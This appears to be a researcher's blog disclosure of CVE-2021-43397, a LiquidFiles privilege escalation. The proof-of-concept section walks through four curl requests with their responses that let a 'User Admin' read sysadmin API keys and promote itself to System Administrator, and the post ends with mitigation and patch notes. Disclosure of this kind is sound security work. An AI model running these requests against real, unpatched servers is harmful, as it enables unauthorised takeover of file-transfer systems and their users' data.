---
image: https://www.liquidfiles.com/assets/images/logo_144x144-362aae5506940de69ed13cf4f518a9d20ca5271f4e82934de4e31cb04f03a37a.png
categories: [cve, pentest]
---

![thumbnail](https://i.imgflip.com/62gg79.jpg)

## Executive summary

Me and 2 other collegues were performing a test for our customers and we discovered a Privilege Escalation from "User Admin" user to "System Administrator" user on LiquidFiles framework.

LiquidFiles is a secure file transfer system for person-to-person email communication. Using LiquidFiles API, a "User Admin" user could list all the application registered users, retrieving information such as their API keys, including those of the System Administrators. 

As per LiquidFiles documentation, API key is used as HTTP basic authentication in order to authenticate to the
LiquidFiles system. A malicious "User Admin" user, by using a "System Administrator"'s API key, can obtain the role of System Administrator and can administer all aspects of the LiquidFiles system.

The impact of a successful attack includes: obtaining access to all aspects of the LiquidFiles system of the application via the System Administrator API key.

This vulnerability was credited by MITRE with id: [CVE-2021-43397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43397) and the original publication is hosted on [packet storm](https://packetstormsecurity.com/files/164997/LiquidFiles-3.5.13-Privilege-Escalation.html).

## Proof of Concept

1. Get the API key of your own user-admins user
    ```bash
    cURL Request:
    curl -X POST -H "Accept: application/json" -H "Content-Type: application/json" -d '{"user":{"email":"[user-admins_user_mail]","password":"[CENSORED]"}}' https://[CENSORED]/login
    
    Response:
    {"user":{"api_key":"[user-admins_user_API_key]"}}
    ```

2. Get a sysadmins' API key
    ```bash
    cURL Request:
    curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:
    application/json" -H "Content-Type: application/json" https://
    [CENSORED]/admin/users

    Response:
    [TRUNCATED]
    {"user":
    {
        "id": "[CENSORED]",
        "email": "[CENSORED]",
        "name": "[CENSORED]",
        "group": "sysadmins",
        "max_file_size": 0,
        "filedrop": "disabled",
        "filedrop_email": "disabled",
        "api_key": "[sysadmins_user_API_key]",
        "ldap_authentication": "false",
        "locale": "",
        "time_zone": "",
        "strong_auth_type": "",
        "strong_auth_username": "",
        "delivery_action": "",
        "phone_number": "",
        "last_login_at": "2021-10-29 10:02:11 UTC",
        "last_login_ip": "[CENSORED]",
        "created_at": "2020-06-30 10:49:38 UTC"
    }
    },
    [TRUNCATED]
    ```

3. Modify the group of your own user-admins user from "user-admins" to "sysadmins"
    ```bash
    cURL Request:
    cat <<EOF | curl -s -X PUT --user "[sysadmins_user_API_key]:x" -H "Accept:
    application/json" -H "Content-Type: application/json" -d @- https://
    [CENSORED]/admin/users/<user-admins_user_id>
    {"user":
    {
        "name": "[user-admins_user_name]",
        "group": "sysadmins"
    }
    }
    EOF

    Response
    {"user":
        {
            "id": "[CENSORED]",
            "email": "[CENSORED]",
            "name": "[CENSORED]",
            "group": "sysadmins",
            "max_file_size": 0,
            "filedrop": "disabled",
            "filedrop_email": "disabled",
            "api_key": "[CENSORED]",
            "ldap_authentication": "true",
            "locale": "",
            "time_zone": "",
            "strong_auth_type": "",
            "strong_auth_username": "",
            "delivery_action": "",
            "phone_number": "",
            "last_login_at": "2021-11-03 13:31:58 UTC",
            "last_login_ip": "[CENSORED]",
            "created_at": "2021-03-03 11:48:37 UTC"
        }
    }
    ```

4. Verify that your own user-admins user is now a sysadmins one.
    ```bash
    cURL Request
    curl -X GET -H "Accept: application/json" -H "Content-Type:
    application/json" --user [user-admins_user_API_key]:x https://
    [CENSORED]/admin/users/<user-admins_user_id>

    Response
    {"user":
        {
            "id": "[CENSORED]",
            "email": "[CENSORED]",
            "name": "[CENSORED]",
            "group": "sysadmins",
            "max_file_size": 0,
            "filedrop": "disabled",
            "filedrop_email": "disabled",
            "api_key": "[CENSORED]",
            "ldap_authentication": "true",
            "locale": "",
            "time_zone": "",
            "strong_auth_type": "",
            "strong_auth_username": "",
            "delivery_action": "",
            "phone_number": "",
            "last_login_at": "2021-11-03 13:34:36 UTC",
            "last_login_ip": "[CENSORED]",
            "created_at": "2021-03-03 11:48:37 UTC"
        }
    }
    ```

## Mitigation and Remediation

To mitigate this vulnerability, the solution is to disable API calls for "Admins" group. Nevertheless, it is suggested to update the solution, as LiquidFiles released an [official patch](https://man.liquidfiles.com/release_notes/version_3-6-x.html) in version 3.6.3.


## Conclusion

It was great to discover this vulnerability and very satisfying to be awarded a CVE, I could get used to it :wink:. If you want a better article for this CVE, look at the one from my collegue [here](https://nananan.github.io/posts/liquid-files-cve/).